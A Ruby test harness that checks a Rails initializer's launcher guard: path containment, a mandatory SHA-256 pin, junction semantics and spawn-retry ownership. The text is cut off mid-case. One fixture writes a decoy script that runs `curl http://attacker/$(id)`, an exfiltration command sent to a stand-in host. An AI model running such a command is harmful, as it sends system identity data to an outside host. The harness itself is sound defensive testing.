# frozen_string_literal: true

# =================================================================================================
# ROUND-34 PROOF HARNESS -- CANONICAL LAUNCHER IDENTITY (path + content) AND `retry_unreaped!`
# =================================================================================================
#
# Run it with:
#
#     cd E:/GitHub/Magi-AGI/av-view-deck && ruby spec/mcp_api/i3_round34_launcher_identity_proof.rb
#
# NO rspec, NO Rails, NO card, NO decko, NO database, NO network, NO child process. `card`
# (1.110.0), `decko` (0.20.0) and railties are not installed on this host and there is no Postgres,
# so a request spec cannot boot; the properties under test are pure control flow over ENV and the
# filesystem, so a bare-ruby harness proves them exactly. Same rationale and same shape as
# spec/mcp_api/i3_binding_initializer_harness.rb.
#
# -------------------------------------------------------------------------------------------------
# THE FINDING THIS FILE CLOSES (verbatim)
# -------------------------------------------------------------------------------------------------
#   "config/initializers/i3_read_binding.rb:446 -- Canonical launcher identity remains unenforced:
#    any readable file with the allowed resolved basename passes without the optional digest.
#    Nil-only refusal and the environment snapshot are fixed; this identity gap remains."
#
# Two halves, both now closed and both proven below BY EXECUTION:
#   PART A  PATH CONTAINMENT -- the resolved script must be EXACTLY
#           <realpath of I3_STORE_SIDECAR_PATH>/tools/i2_stdio_reader_service.py. Case 2.
#   PART B  MANDATORY CONTENT PIN -- I3_I2_SCRIPT_SHA256 is now a member of REQUIRED_ENV and an
#           absent/blank value is a REFUSAL, not a skip. Case 3.
#
# WHAT MAKES THIS A REAL PROOF, not a mock theatre. Every path case uses REAL FILES written to
# REAL directories under the scratch dir, resolved by REAL `File.realpath`, and hashed by REAL
# `Digest::SHA256`. Nothing about the filesystem is stubbed. Case 0 additionally RE-RUNS THE
# PRE-FIX FILE (config/initializers/i3_read_binding.rb.bak-r34-pre) in a CHILD RUBY PROCESS to
# demonstrate that cases 2 and 3 genuinely FAILED before the change -- a regression test that
# cannot distinguish old from new code is not evidence.
#
# -------------------------------------------------------------------------------------------------
# WHAT THIS HARNESS DOES **NOT** PROVE -- read before treating green as deployment evidence
# -------------------------------------------------------------------------------------------------
# * NO PROCESS IS EVER SPAWNED. Case 9's `retry_unreaped!` doubles record `stop!` calls and return
#   scripted verdicts; they prove the installer's RE-STOP BOOKKEEPING and call sequence, never that
#   an OS process died. `:confirmed` is the Spawn's own claim either way.
# * NATIVE FILE SYMLINKS CANNOT BE CREATED ON THIS HOST (`File.symlink` answers Errno::EACCES
#   without SeCreateSymbolicLinkPrivilege / Developer Mode). Case 8 therefore proves the
#   follow-the-target semantics with NTFS DIRECTORY JUNCTIONS, which `File.realpath` resolves
#   identically; the native-file-symlink variant is attempted and reported as an explicit LIMIT
#   when unavailable. It is never counted as a pass.
# * AN UNREADABLE-BUT-PRESENT FILE IS NOT PROVABLE HERE either: Windows ACL semantics mean
#   `File.chmod(0)` leaves the owner able to read, so case 7 proves the non-regular / missing /
#   dangling-link arms of `regular_readable_file?` and reports the EACCES arm as a LIMIT.
# * No HTTP, no controller, no 503 is observed. "unwired => 503" is `I3ReadPort`'s own contract.
# =================================================================================================

require "digest"
require "fileutils"
require "json"

PASS = []
FAIL = []
LIMITS = []

def check(label)
  ok = yield
  (ok ? PASS : FAIL) << label
  puts "#{ok ? 'PASS' : 'FAIL'}: #{label}"
rescue StandardError, ScriptError => e
  FAIL << "#{label} (raised #{e.class}: #{e.message})"
  puts "FAIL: #{label} (raised #{e.class}: #{e.message})"
end

def limit(label)
  LIMITS << label
  puts "LIMIT (not a pass, not a failure): #{label}"
end

INITIALIZER = File.expand_path("../../config/initializers/i3_read_binding.rb", __dir__)
PRE_FIX_FILE = File.expand_path("../../config/initializers/i3_read_binding.rb.bak-r34-pre", __dir__)
abort "initializer not found at #{INITIALIZER}" unless File.exist?(INITIALIZER)

# ---- scratch layout -----------------------------------------------------------------------------
# Real directories, real files. SCRATCH is the Hermes scratch dir (pruned after 72h); everything
# this harness creates lives under one run-scoped subdirectory and is removed at the end.
SCRATCH_ROOT = ENV.fetch(
  "I3_PROOF_SCRATCH",
  "C:/Users/Lake/AppData/Local/hermes/profiles/claudetriad/cache/scratch"
)
RUN_DIR = File.join(SCRATCH_ROOT, "i3_round34_proof_#{Process.pid}")

CANON = "i2_stdio_reader_service.py"
GOLDEN_SERVER = "i2_stdio_reader_server.py"

# The real launcher body is irrelevant to identity -- only its bytes matter -- but a realistic
# payload keeps the digests meaningful rather than hashing an empty file.
LAUNCHER_BODY = <<~PY
  #!/usr/bin/env python3
  """STORE's real-input service launcher (proof fixture, not the deployed file)."""
  from atomspace_mirror_sidecar import i2_stdio_service

  if __name__ == "__main__":
      i2_stdio_service.main()
PY

FileUtils.rm_rf(RUN_DIR)
FileUtils.mkdir_p(File.join(RUN_DIR, "sidecar", "tools"))
FileUtils.mkdir_p(File.join(RUN_DIR, "elsewhere", "tools"))
FileUtils.mkdir_p(File.join(RUN_DIR, "attacker"))

SIDECAR_ROOT   = File.realpath(File.join(RUN_DIR, "sidecar"))
APPROVED_PATH  = File.join(SIDECAR_ROOT, "tools", CANON)
File.write(APPROVED_PATH, LAUNCHER_BODY)
APPROVED_DIGEST = Digest::SHA256.file(APPROVED_PATH).hexdigest

# A DIFFERENT readable file with the SAME canonical basename, outside the approved tree. This is
# the exact artefact the finding describes: "any readable file with the allowed resolved basename".
OUTSIDE_PATH = File.join(File.realpath(File.join(RUN_DIR, "elsewhere")), "tools", CANON)
File.write(OUTSIDE_PATH, "import os\nos.system('curl http://attacker/\\x24(id)')\n")

# The deck's golden/MODEL server, placed INSIDE the approved tools dir so case 6 proves the
# dedicated golden-server refusal is not swallowed by the new containment/digest checks.
GOLDEN_PATH = File.join(SIDECAR_ROOT, "tools", GOLDEN_SERVER)
File.write(GOLDEN_PATH, "# VIEW's model server (proof fixture)\n")

# A directory that is NAMED like the launcher (non-regular file arm of case 7).
DIR_NAMED_CANON = File.join(SIDECAR_ROOT, "tools", "subdir_#{CANON}")
FileUtils.mkdir_p(DIR_NAMED_CANON)

MISSING_PATH = File.join(SIDECAR_ROOT, "tools", "does_not_exist_#{CANON}")

# A real interpreter path that resolves: this harness drives the script guard directly for most
# cases, but case 11 drives the whole `validated_launch` snapshot and needs every var to be valid.
REAL_INTERPRETER = File.realpath(RbConfig.ruby)

# ---- junction helper (NTFS directory junctions; no privilege required) ---------------------------
def make_junction(link, target)
  return false unless RbConfig::CONFIG["host_os"] =~ /mswin|mingw/

  l = link.tr("/", "\\")
  t = target.tr("/", "\\")
  system("cmd", "/c", "mklink", "/J", l, t, out: File::NULL, err: File::NULL)
  File.exist?(link) || Dir.exist?(link)
rescue StandardError
  false
end

def try_file_symlink(link, target)
  File.symlink(target, link)
  true
rescue StandardError
  false
end

# ---- minimal port double: `refuse!` calls `reset_port!`, which is `defined?`-guarded ------------
module Atomspace
  module I3ReadPort
    class << self
      attr_reader :impl, :reset_count

      def bind!(impl)
        @impl = impl
      end

      def reset!
        @impl = nil
        @reset_count = (@reset_count || 0) + 1
      end

      def clear_counters!
        @impl = nil
        @reset_count = 0
      end
    end
  end
end

# Load with Rails UNDEFINED so the after_initialize hook at the bottom never registers.
load INITIALIZER
INSTALLER = Atomspace::I3ReadBindingInstaller

# `refuse_script_reason` is private (it is an internal guard, not an API), so the harness drives it
# with `send` -- deliberately testing the REAL method rather than a re-implementation.
def script_reason(script, root: SIDECAR_ROOT, pin: APPROVED_DIGEST)
  INSTALLER.send(:refuse_script_reason, script, sidecar_root: root, digest_pin: pin)
end

# Every refusal must be a TRUTHY STRING. `false` and `nil` are both forbidden on a failure path:
# `nil` means success and nothing else, and a `false` return was the original nil-only-refusal bug.
def refusal?(reason)
  reason.is_a?(String) && !reason.empty?
end

COLLECTED_REASONS = []

def refuse_case(label, script, root: SIDECAR_ROOT, pin: APPROVED_DIGEST, must_include: nil)
  reason = script_reason(script, root: root, pin: pin)
  COLLECTED_REASONS << reason if reason.is_a?(String)
  check(label) do
    ok = refusal?(reason)
    ok &&= reason.include?(must_include) if must_include
    ok
  end
  reason
end

puts "=" * 99
puts "I3 ROUND-34 LAUNCHER IDENTITY PROOF  (no rspec, no Rails, no DB, no child python process)"
puts "file under test : #{INITIALIZER}"
puts "pre-fix baseline: #{PRE_FIX_FILE}"
puts "scratch run dir : #{RUN_DIR}"
puts "approved digest : #{APPROVED_DIGEST}"
puts "=" * 99

# =================================================================================================
# CASE 0 -- THE PRE-FIX FILE REALLY DID ACCEPT BOTH DEFECTS (run in a child ruby process)
# =================================================================================================
# A regression test that passes against the old code proves nothing. This loads the untouched
# .bak-r34-pre in a SEPARATE process (two versions of the same module cannot coexist in one) and
# asks the OLD `refuse_script_reason` the two questions the finding is about. Expected OLD answers:
# nil (= ACCEPTED) for an outside-the-tree file, and nil (= ACCEPTED) with NO digest pin at all.
if File.exist?(PRE_FIX_FILE)
  probe = File.join(RUN_DIR, "pre_fix_probe.rb")
  File.write(probe, <<~RB)
    module Atomspace
      module I3ReadPort
        def self.reset!; end
      end
    end
    load #{PRE_FIX_FILE.dump}
    I = Atomspace::I3ReadBindingInstaller
    ENV.delete("I3_I2_SCRIPT_SHA256")   # the OLD code read the pin straight from ENV here
    outside = I.send(:refuse_script_reason, #{OUTSIDE_PATH.dump})
    approved = I.send(:refuse_script_reason, #{APPROVED_PATH.dump})
    arity = I.method(:refuse_script_reason).arity
    puts JSON.generate(
      "outside_accepted" => outside.nil?,
      "approved_accepted_without_pin" => approved.nil?,
      "arity" => arity
    )
  RB
  out = `ruby -rjson #{probe.dump} 2>&1`
  pre = begin
    JSON.parse(out.lines.grep(/^\{/).last.to_s)
  rescue StandardError
    nil
  end

  check("0a PRE-FIX code ACCEPTED a basename-matching file OUTSIDE the sidecar tree " \
        "(the finding was real)") do
    pre && pre["outside_accepted"] == true
  end
  check("0b PRE-FIX code ACCEPTED the launcher with NO digest pin set at all " \
        "(absent pin == pass)") do
    pre && pre["approved_accepted_without_pin"] == true
  end
  check("0c PRE-FIX signature took ONE positional arg (no containment root, no pin threaded)") do
    pre && pre["arity"] == 1
  end
  puts "     (pre-fix child output: #{out.strip.lines.last.to_s.strip})"
else
  limit("0 pre-fix baseline #{PRE_FIX_FILE} is absent, so the before-state could not be re-run")
end

# =================================================================================================
# CASE 1 -- THE ONE ACCEPTING CONFIGURATION: approved path + matching pin => reason nil
# =================================================================================================
r1 = script_reason(APPROVED_PATH)
check("1a approved path + correct matching pin => ACCEPTED (reason is exactly nil)") { r1.nil? }
check("1b acceptance is nil, never false/true (nil-only-success invariant)") do
  r1.nil? && r1 != false
end
check("1c the pin really is the SHA-256 of the file on disk (real hash, real bytes)") do
  Digest::SHA256.file(APPROVED_PATH).hexdigest == APPROVED_DIGEST &&
    APPROVED_DIGEST.match?(/\A[0-9a-f]{64}\z/)
end
# [CPD-035] STRICT PIN. The normalising `pin.strip.downcase` was REMOVED: the contract and the
# refusal string both advertise exactly 64 LOWERCASE hex characters, so a padded or upper-case pin
# must now be REFUSED rather than silently normalised into acceptance.
check("1d pin with surrounding whitespace is REFUSED (no strip; strictly 64 lowercase hex)") do
  r = script_reason(APPROVED_PATH, pin: "  #{APPROVED_DIGEST}  ")
  refusal?(r) && r.include?("64 lowercase hex")
end
check("1d2 an UPPERCASE pin is REFUSED (no downcase), even though it is the right digest") do
  r = script_reason(APPROVED_PATH, pin: APPROVED_DIGEST.upcase)
  refusal?(r) && r.include?("64 lowercase hex")
end
check("1d3 the strict check is in the source: no strip/downcase normalisation of the pin") do
  src = File.read(INITIALIZER)
  !src.include?("pin = pin.strip.downcase")
end

# =================================================================================================
# CASE 2 -- **PART A**: a readable file with the CORRECT BASENAME but OUTSIDE <root>/tools
# =================================================================================================
# THIS IS THE CODEX FINDING. Case 0a proves the old code answered nil here.
r2 = refuse_case(
  "2a basename-correct file OUTSIDE <sidecar root>/tools => REFUSED (path containment)",
  OUTSIDE_PATH
)
check("2b the containment refusal is specifically about location, and names the env var") do
  refusal?(r2) && r2.include?("I3_STORE_SIDECAR_PATH") && r2 =~ /OUTSIDE|resolve/i
end
check("2c the outside file is genuinely READABLE and genuinely canonically named " \
      "(so the refusal is the containment check, not an accident)") do
  File.readable?(OUTSIDE_PATH) && File.stat(OUTSIDE_PATH).file? &&
    File.basename(File.realpath(OUTSIDE_PATH)) == CANON
end
# Right basename, right root, WRONG subdirectory.
wrong_subdir = File.join(SIDECAR_ROOT, "bin")
FileUtils.mkdir_p(wrong_subdir)
File.write(File.join(wrong_subdir, CANON), LAUNCHER_BODY)
refuse_case("2d correct basename under <root>/bin instead of <root>/tools => REFUSED",
            File.join(wrong_subdir, CANON))
# Right basename, root that merely SHARES A PREFIX with the approved root (no separator boundary):
# the exact case a `start_with?` containment test would wrongly accept.
sibling_root = "#{RUN_DIR}/sidecar-evil"
FileUtils.mkdir_p(File.join(sibling_root, "tools"))
File.write(File.join(sibling_root, "tools", CANON), LAUNCHER_BODY)
refuse_case("2e prefix-sharing sibling root <root>-evil/tools/<canonical> => REFUSED " \
            "(exact equality, not start_with?)",
            File.join(sibling_root, "tools", CANON))
# A traversal that lands back outside the tree.
refuse_case("2f traversal <root>/tools/../../elsewhere/tools/<canonical> => REFUSED",
            File.join(SIDECAR_ROOT, "tools", "..", "..", "elsewhere", "tools", CANON))
# And the root itself being unresolvable must refuse rather than skip containment.
refuse_case("2g unresolvable I3_STORE_SIDECAR_PATH => REFUSED (containment cannot be proven)",
            APPROVED_PATH, root: File.join(RUN_DIR, "no_such_root"),
            must_include: "I3_STORE_SIDECAR_PATH")
refuse_case("2h I3_STORE_SIDECAR_PATH naming a FILE, not a directory => REFUSED",
            APPROVED_PATH, root: APPROVED_PATH, must_include: "I3_STORE_SIDECAR_PATH")
refuse_case("2i blank I3_STORE_SIDECAR_PATH => REFUSED", APPROVED_PATH, root: "   ")
refuse_case("2j nil I3_STORE_SIDECAR_PATH => REFUSED", APPROVED_PATH, root: nil)

# =================================================================================================
# CASE 3 -- **PART B**: correct canonical path, pin ABSENT / BLANK => REFUSED
# =================================================================================================
# THIS IS THE OTHER HALF OF THE FINDING. Case 0b proves the old code answered nil here.
r3 = refuse_case("3a approved path, pin NIL => REFUSED (mandatory content pin)",
                 APPROVED_PATH, pin: nil, must_include: "I3_I2_SCRIPT_SHA256")
check("3b the absent-pin refusal says the pin is REQUIRED (its own distinct reason)") do
  refusal?(r3) && r3 =~ /REQUIRED/ && r3 =~ /absent or blank/
end
r3c = refuse_case("3c approved path, pin EMPTY STRING => REFUSED", APPROVED_PATH, pin: "")
r3d = refuse_case("3d approved path, pin WHITESPACE ONLY => REFUSED", APPROVED_PATH, pin: "   \t ")
check("3e absent / empty / whitespace pins all give the SAME dedicated reason") do
  r3 == r3c && r3c == r3d
end
check("3f the absent-pin reason is DISTINCT from the malformed-pin reason") do
  r3 != script_reason(APPROVED_PATH, pin: "nope")
end
check("3g I3_I2_SCRIPT_SHA256 is now a member of REQUIRED_ENV (it participates in the " \
      "single frozen ENV read)") do
  INSTALLER::REQUIRED_ENV.include?("I3_I2_SCRIPT_SHA256")
end
check("3h ValidatedLaunch carries script_digest, so the pin is snapshotted, not re-read") do
  INSTALLER::ValidatedLaunch.members.include?(:script_digest)
end
check("3i `digest_refusal_for` performs NO ENV read of its own (pin arrives as an argument)") do
  INSTALLER.method(:digest_refusal_for).arity == 2 &&
    INSTALLER.send(:method, :digest_refusal_for).parameters.map(&:last) == %i[resolved pin]
end

# =================================================================================================
# CASE 4 -- malformed pin (not 64 lowercase hex) => REFUSED
# =================================================================================================
[
  ["too short", APPROVED_DIGEST[0, 63]],
  ["too long", "#{APPROVED_DIGEST}0"],
  ["non-hex characters", "z#{APPROVED_DIGEST[1..]}"],
  ["sha-1 length", Digest::SHA1.file(APPROVED_PATH).hexdigest],
  ["prefixed", "sha256:#{APPROVED_DIGEST}"],
  ["internal space", "#{APPROVED_DIGEST[0, 32]} #{APPROVED_DIGEST[32..]}"],
  ["not a hash at all", "the-approved-one"]
].each do |why, bad|
  refuse_case("4 malformed pin (#{why}) => REFUSED", APPROVED_PATH, pin: bad,
              must_include: "I3_I2_SCRIPT_SHA256")
end
check("4z the malformed-pin reason no longer says \"when set\" (the pin is not optional)") do
  r = script_reason(APPROVED_PATH, pin: "nope")
  refusal?(r) && !r.include?("when set")
end

# =================================================================================================
# CASE 5 -- well-formed pin, WRONG digest => REFUSED
# =================================================================================================
WRONG_DIGEST = Digest::SHA256.hexdigest("a different approved build")
r5 = refuse_case("5a approved path, well-formed but WRONG pin => REFUSED (content mismatch)",
                 APPROVED_PATH, pin: WRONG_DIGEST)
check("5b the mismatch reason is distinct from the absent-pin and malformed-pin reasons") do
  refusal?(r5) && r5 != r3 && r5 != script_reason(APPROVED_PATH, pin: "nope")
end
check("5c WRONG_DIGEST really is well-formed 64-lowercase-hex (so 5a tested the COMPARISON, " \
      "not the format gate)") do
  WRONG_DIGEST.match?(/\A[0-9a-f]{64}\z/) && WRONG_DIGEST != APPROVED_DIGEST
end
# The round-033 MANIFEST value is the real operator-supplied digest for the DEPLOYED launcher. It
# is cited here exactly as the initializer's header cites it; against this harness's own fixture
# bytes it is correctly a MISMATCH, which is itself the proof that nothing hardcodes it as a pass.
MANIFEST_DIGEST = "46b0f687c02b8e5df078a3bea4b7322149019c79939782ca607528d09cd52f88"
check("5d the round-033 MANIFEST digest is NOT hardcoded anywhere in the initializer source") do
  !File.read(INITIALIZER).scan(/^[^#]*#{MANIFEST_DIGEST}/).any?
end
refuse_case("5e the round-033 MANIFEST digest against DIFFERENT bytes => REFUSED " \
            "(no digest is ever blessed by constant)",
            APPROVED_PATH, pin: MANIFEST_DIGEST)

# =================================================================================================
# CASE 6 -- the golden/MODEL server keeps its OWN distinct refusal (regression guard)
# =================================================================================================
r6 = refuse_case("6a golden/MODEL server i2_stdio_reader_server.py => REFUSED",
                 GOLDEN_PATH, must_include: GOLDEN_SERVER)
check("6b the golden-server refusal is its OWN reason, not swallowed by containment or digest") do
  refusal?(r6) && r6 =~ /golden\/MODEL server/ && r6 =~ /store-projection/ &&
    !r6.include?("OUTSIDE") && !r6.include?("I3_I2_SCRIPT_SHA256")
end
check("6c the golden server sits INSIDE <root>/tools and has a VALID pin, and is STILL refused " \
      "(so 6a is the name guard, not an incidental failure)") do
  File.realpath(GOLDEN_PATH) == File.join(SIDECAR_ROOT, "tools", GOLDEN_SERVER) &&
    refusal?(script_reason(GOLDEN_PATH, pin: Digest::SHA256.file(GOLDEN_PATH).hexdigest))
end
# A third, unrelated basename still gets the generic canonical-launcher refusal.
other = File.join(SIDECAR_ROOT, "tools", "some_other_reader.py")
File.write(other, LAUNCHER_BODY)
r6d = refuse_case("6d an unrelated basename in <root>/tools => REFUSED (generic name guard)", other)
check("6e the generic name refusal names the canonical launcher and is distinct from 6a") do
  refusal?(r6d) && r6d.include?(CANON) && r6d != r6
end

# =================================================================================================
# CASE 7 -- NIL-ONLY REFUSAL REGRESSION GUARD: missing / directory / dangling link / unresolvable
# =================================================================================================
refuse_case("7a missing file => REFUSED (never nil, never false)", MISSING_PATH)
refuse_case("7b a DIRECTORY (even one named canonically) => REFUSED", DIR_NAMED_CANON)
refuse_case("7c the <root>/tools DIRECTORY itself => REFUSED", File.join(SIDECAR_ROOT, "tools"))
refuse_case("7d nil script => REFUSED", nil)
refuse_case("7e blank script => REFUSED", "   ")
refuse_case("7f empty string script => REFUSED", "")
refuse_case("7g a non-String script (Integer) => REFUSED via default-deny rescue", 42)
refuse_case("7h a non-String script (Array) => REFUSED via default-deny rescue", [APPROVED_PATH])

# A DANGLING link: a junction whose target is deleted after the junction is made. `File.realpath`
# cannot resolve through it, which is the dead-symlink arm.
dangling_target = File.join(RUN_DIR, "soon_deleted")
FileUtils.mkdir_p(File.join(dangling_target, "tools"))
File.write(File.join(dangling_target, "tools", CANON), LAUNCHER_BODY)
dangling_link = File.join(RUN_DIR, "dangling_link")
if make_junction(dangling_link, dangling_target)
  FileUtils.rm_rf(dangling_target)
  refuse_case("7i DANGLING link (junction to a deleted target) => REFUSED", 
              File.join(dangling_link, "tools", CANON))
else
  limit("7i dangling-link case skipped: NTFS junction creation unavailable in this session")
end

check("7z EVERY refusal collected so far is a non-empty String -- no refusal path ever " \
      "returned false or nil (the nil-only-refusal invariant)") do
  COLLECTED_REASONS.any? && COLLECTED_REASONS.all? { |r| r.is_a?(String) && !r.empty? }
end

# =================================================================================================
# CASE 8 -- LINK SEMANTICS, ASSERTED DELIBERATELY: resolution FOLLOWS THE TARGET
# =================================================================================================
# THE DOCUMENTED BEHAVIOUR (initializer: "SYMLINK / JUNCTION SEMANTICS, STATED DELIBERATELY"):
# `File.realpath` + `File.stat` follow the target, never `lstat`. So a link whose NAME is canonical
# and which sits inside <root>/tools is judged by WHERE IT POINTS:
#   * target OUTSIDE the approved tree  => REFUSED by containment (8a)
#   * target IS the approved file       => ACCEPTED, because it resolves to that exact path (8c)
# That is the intended semantics: the thing actually launched is the target, so the TARGET is what
# must be approved. 8b additionally proves the root may itself be reached through a link.

# 8a: <root>/tools reached through a junction whose target is an attacker-controlled directory.
linked_root = File.join(RUN_DIR, "linked_sidecar")
FileUtils.mkdir_p(linked_root)
attacker_tools = File.join(RUN_DIR, "attacker", "tools")
FileUtils.mkdir_p(attacker_tools)
File.write(File.join(attacker_tools, CANON), "print('attacker payload')\n")
if make_junction(File.join(linked_root, "tools"), attacker_tools)
  script_via_link = File.join(linked_root, "tools", CANON)
  r8a = refuse_case(
    "8a link NAMED canonically in <root>/tools but whose TARGET is an attacker tree => " \
    "REFUSED (link judged by target; documented semantics)",
    script_via_link, root: linked_root
  )
  check("8b 8a's path really does resolve OUT of the nominal root (the link indirection is " \
        "real, not a missing file)") do
    resolved = File.realpath(script_via_link)
    resolved == File.join(File.realpath(attacker_tools), CANON) &&
      resolved != File.join(File.realpath(linked_root), "tools", CANON) &&
      refusal?(r8a)
  end
else
  limit("8a/8b link-into-attacker-tree case skipped: NTFS junction creation unavailable")
end

# 8c: the sidecar ROOT itself reached through a junction, pointing at the genuine approved tree.
# Both sides get the same resolution applied, so this must be ACCEPTED.
alias_root = File.join(RUN_DIR, "alias_sidecar")
if make_junction(alias_root, SIDECAR_ROOT)
  check("8c the approved launcher reached through a junctioned ROOT => ACCEPTED (both sides " \
        "are realpaths, so a legitimate link deployment still binds)") do
    script_reason(File.join(alias_root, "tools", CANON), root: alias_root).nil?
  end
  check("8d mixing a junctioned root with the REAL script path is also ACCEPTED (same realpath)") do
    script_reason(APPROVED_PATH, root: alias_root).nil?
  end
else
  limit("8c/8d junctioned-root case skipped: NTFS junction creation unavailable")
end

# 8e: the native FILE symlink variant, attempted for real.
native_link = File.join(SIDECAR_ROOT, "tools", "native_link_#{CANON}")
if try_file_symlink(native_link, OUTSIDE_PATH)
  check("8e native FILE symlink inside <root>/tools pointing OUTSIDE => REFUSED " \
        "(stat/realpath follow the target)") do
    refusal?(script_reason(native_link))
  end
else
  limit("8e native FILE symlink not created (File.symlink => Errno::EACCES without " \
        "SeCreateSymbolicLinkPrivilege/Developer Mode). The follow-the-target semantics are " \
        "proven by the JUNCTION cases 8a-8d instead; the native-symlink variant is UNPROVEN " \
        "on this host")
end

# =================================================================================================
# CASE 9 -- `retry_unreaped!`: the RE-STOP guarantee (the API a sibling worker codes against)
# =================================================================================================
# A Spawn double whose `stop!` returns a SCRIPTED SEQUENCE of verdicts, so "retried across calls"
# is observable: first call :unconfirmed (stays retained), second call :confirmed (removed).
class SequencedSpawn
  attr_reader :stop_calls, :name

  def initialize(name, verdicts)
    @name = name
    @verdicts = verdicts.dup
    @stop_calls = 0
  end

  def stop!
    @stop_calls += 1
    @verdicts.shift || :unconfirmed
  end
end

class RaisingSpawn < SequencedSpawn
  def stop!
    @stop_calls += 1
    raise "simulated stop! explosion"
  end
end

class StoplessSpawn
  def stop_calls = 0
end

# [CPD-035 FIX 3] `retry_unreaped!` now only signals spawns whose CREATING pid was recorded in
# `spawn_owner_pids` at retention time. Injecting straight into @unreaped bypasses
# `retain_unreaped!`, so the helper records ownership too -- that is what a spawn created by THIS
# process looks like. Cases that need a FOREIGN entry use `reset_unreaped_foreign!` below.
def reset_unreaped!(list)
  INSTALLER.instance_variable_set(:@unreaped, list)
  owners = INSTALLER.spawn_owner_pids
  owners.clear
  list.each { |s| owners[s.object_id] = Process.pid }
  list
end

# Retained entries whose recorded creating pid is ANOTHER process (what a forked worker inherits).
def reset_unreaped_foreign!(list, pid: Process.pid + 1_000_000)
  INSTALLER.instance_variable_set(:@unreaped, list)
  owners = INSTALLER.spawn_owner_pids
  owners.clear
  list.each { |s| owners[s.object_id] = pid }
  list
end

# 9a/9b: retried ACROSS calls; only the confirmed one is removed; counts are accurate.
flaky = SequencedSpawn.new("flaky", [:unconfirmed, :confirmed])
stubborn = SequencedSpawn.new("stubborn", [:unconfirmed, :unconfirmed, :unconfirmed])
INSTALLER.instance_variable_set(:@installed_pid, nil) # the whole point: no owned claim
reset_unreaped!([flaky, stubborn])

sweep1 = INSTALLER.retry_unreaped!
check("9a1 first sweep: both retained spawns were stopped once each") do
  flaky.stop_calls == 1 && stubborn.stop_calls == 1
end
check("9a2 first sweep: nothing confirmed, so nothing removed; the Hash reports it") do
  sweep1 == { confirmed: 0, remaining: 2, skipped_foreign: 0 } &&
    INSTALLER.unreaped_spawns.size == 2
end
check("9a3 retry_unreaped! works with @installed_pid == nil (shutdown_owned_child! cannot)") do
  INSTALLER.installed_pid.nil? && INSTALLER.shutdown_owned_child! == :not_owned &&
    sweep1[:remaining] == 2
end

sweep2 = INSTALLER.retry_unreaped!
check("9b1 second sweep: the retained spawns are RETRIED (stop! called again)") do
  flaky.stop_calls == 2 && stubborn.stop_calls == 2
end
check("9b2 second sweep: ONLY the :confirmed one is removed") do
  !INSTALLER.unreaped_spawns.include?(flaky) && INSTALLER.unreaped_spawns.include?(stubborn)
end
check("9b3 second sweep: the Hash is { confirmed: 1, remaining: 1, skipped_foreign: 0 } exactly") do
  sweep2 == { confirmed: 1, remaining: 1, skipped_foreign: 0 }
end
check("9b4 the return value is a Hash with exactly the documented Integer keys") do
  sweep2.is_a?(Hash) && sweep2.keys.sort == %i[confirmed remaining skipped_foreign] &&
    sweep2.values.all? { |v| v.is_a?(Integer) }
end

sweep3 = INSTALLER.retry_unreaped!
check("9c calling it again is SAFE and idempotent in shape (still a Hash, still accurate)") do
  sweep3 == { confirmed: 0, remaining: 1, skipped_foreign: 0 } && stubborn.stop_calls == 3
end

# 9d: a foreign @installed_pid -- the sweep STILL RUNS (preserved behaviour). This is the state a
# fork or a failed install leaves behind, and it is the only state in which the sweep is needed.
# The CLAIM pid is foreign here but the retained SPAWN was created by this process, so it is swept.
INSTALLER.instance_variable_set(:@installed_pid, Process.pid + 1_000_000)
foreign_ok = SequencedSpawn.new("foreign", [:confirmed])
reset_unreaped!([foreign_ok])
sweep4 = INSTALLER.retry_unreaped!
check("9d retry_unreaped! sweeps even when @installed_pid belongs to ANOTHER pid") do
  sweep4 == { confirmed: 1, remaining: 0, skipped_foreign: 0 } && foreign_ok.stop_calls == 1 &&
    INSTALLER.unreaped_spawns.empty?
end
INSTALLER.instance_variable_set(:@installed_pid, nil)

# =================================================================================================
# CASE 9z -- [CPD-035 FIX 3] OWNERSHIP SCOPING: a spawn created by ANOTHER pid is NEVER signalled.
# =================================================================================================
# Codex blocker 3: `unreaped_spawns` survives a fork and `disown_inherited!` deliberately clears
# only @installed_pid/@spawn, so a forked worker's retention list holds the MASTER's children.
# `Spawn#stop!` closes shared pipe FDs and escalates to TERM/KILL, so sweeping them would tear
# down the parent's reader. They must be RECORDED, never stopped.
inherited_a = SequencedSpawn.new("inherited_a", [:confirmed])
inherited_b = SequencedSpawn.new("inherited_b", [:confirmed])
reset_unreaped_foreign!([inherited_a, inherited_b])
sweep9z = INSTALLER.retry_unreaped!
check("9z1 a spawn whose recorded creating pid is FOREIGN is NEVER stopped") do
  inherited_a.stop_calls.zero? && inherited_b.stop_calls.zero?
end
check("9z2 foreign entries are RETAINED, not dropped (the runbook must still see them)") do
  INSTALLER.unreaped_spawns.include?(inherited_a) &&
    INSTALLER.unreaped_spawns.include?(inherited_b)
end
check("9z3 the Hash COUNTS them: { confirmed: 0, remaining: 2, skipped_foreign: 2 }") do
  sweep9z == { confirmed: 0, remaining: 2, skipped_foreign: 2 }
end
check("9z4 foreign_unreaped_spawns enumerates exactly the inherited entries") do
  INSTALLER.foreign_unreaped_spawns == [inherited_a, inherited_b]
end
# An entry with NO recorded owner is UNPROVABLE and therefore also treated as foreign.
unknown = SequencedSpawn.new("unknown_owner", [:confirmed])
INSTALLER.instance_variable_set(:@unreaped, [unknown])
INSTALLER.spawn_owner_pids.clear
sweep9z2 = INSTALLER.retry_unreaped!
check("9z5 an entry with NO recorded owner is treated as FOREIGN (fail closed, not stopped)") do
  unknown.stop_calls.zero? && sweep9z2 == { confirmed: 0, remaining: 1, skipped_foreign: 1 }
end
# A MIXED list: only the owned one is signalled, and one foreign entry does not block the sweep.
mine = SequencedSpawn.new("mine", [:confirmed])
theirs = SequencedSpawn.new("theirs", [:confirmed])
INSTALLER.instance_variable_set(:@unreaped, [theirs, mine])
INSTALLER.spawn_owner_pids.clear
INSTALLER.spawn_owner_pids[theirs.object_id] = Process.pid + 1_000_000
INSTALLER.spawn_owner_pids[mine.object_id] = Process.pid
sweep9z3 = INSTALLER.retry_unreaped!
check("9z6 MIXED list: only the OWNED spawn is stopped+removed, the foreign one is untouched") do
  mine.stop_calls == 1 && theirs.stop_calls.zero? &&
    !INSTALLER.unreaped_spawns.include?(mine) && INSTALLER.unreaped_spawns.include?(theirs) &&
    sweep9z3 == { confirmed: 1, remaining: 1, skipped_foreign: 1 }
end
check("9z7 retain_unreaped! RECORDS the creating pid, so a normally-retained spawn is OWNED") do
  INSTALLER.instance_variable_set(:@unreaped, [])
